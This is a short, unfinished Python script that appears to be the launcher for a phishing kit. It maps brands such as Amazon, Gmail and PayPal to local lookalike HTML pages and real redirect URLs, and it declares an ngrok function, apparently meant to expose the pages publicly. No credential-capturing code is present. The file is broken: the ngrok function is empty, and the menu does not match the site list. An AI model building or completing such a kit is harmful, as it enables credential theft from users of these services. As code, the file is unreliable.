from utils import print_welcome_message, get_ip_info

sites = {
    "1": {"name": "Amazon", "html": "amazon.html", "redirect": "https://amazon.com"},
    "2": {"name": "Ebay", "html": "ebay.html", "redirect": "https://ebay.com"},
    "3": {"name": "Gmail", "html": "gmail.html", "redirect": "https://mail.google.com"},
    "4": {"name": "LinkedIn", "html": "linkedin.html", "redirect": "https://linkedin.com"},
    "5": {"name": "YouTube", "html": "youtube.html", "redirect": "https://youtube.com"},
    "6": {"name": "Netflix", "html": "netflix.html", "redirect": "https://netflix.com"},
    "7": {"name": "PayPal", "html": "paypal.html", "redirect": "https://paypal.com"},
}

def start_ngrok():
    

def main():
    print_welcome_message()

    print(""" 
        [1] Amazon
        [2] Ebay
        [3] Linkedin
        [4] Netflix
    """)

    choice = input("Insert your choice: ")

    if choice == "1":
        print("you choose Amazon")
    elif choice == "2":
        print("you choose Ebay")
    elif choice == "3":
        print("you choose Linkedin")
    elif choice == "4":
        print("you choose Netflix")
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()